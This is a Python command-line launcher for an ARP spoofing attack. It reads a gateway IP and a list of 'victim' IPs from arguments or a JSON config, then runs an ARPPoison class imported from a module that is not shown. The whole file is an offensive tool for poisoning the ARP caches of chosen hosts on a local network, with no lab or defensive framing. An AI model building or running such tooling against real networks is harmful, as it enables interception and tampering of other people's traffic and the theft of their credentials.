#! /usr/bin/env python

import json
import argparse

from jsonschema import validate
from arp_poison import ARPPoison

def load_from_config(path):
    config_schema = {
        "type" : "object",
        "properties" : {
            "gateway_ip" : {"type" : "string"},
            "victim_list" : {"type" : "array"},
        },
    }

    with open(path) as config_json:
        data = json.load(config_json)
        validate(instance = data, schema = config_schema)

        return data

def create_args_parser():
    parser = argparse.ArgumentParser(description = 'ARP Spoofing script.', usage='arps [OPTIONS ...]')
    parser.add_argument('-l', '--victim-list', dest='victim_list', nargs = "+", help='victim ip list', required = False)
    parser.add_argument('-g', '--gateway-ip', dest='gateway_ip', help='gateway ip info', required = False)
    parser.add_argument('-c', '--config', dest = 'config_path', help = 'path to json config file', required = False)

    return parser

def main():
    gateway_ip = None
    victim_list = []

    parser = create_args_parser()
    args = parser.parse_args()

    if args.config_path != None:
        data = load_from_config(args.config_path)
        gateway_ip = data['gateway_ip']
        victim_list = data['victim_list']
    
    if args.gateway_ip != None:
        gateway_ip = args.gateway_ip
    if args.victim_list != None:
        victim_list = args.victim_list

    if gateway_ip != None and victim_list != None:
        poison = ARPPoison(gateway_ip, victim_list)
        poison.run()
    else:
        print("invalid args for run use arps -h")

    pass

if __name__ == "__main__":
    main()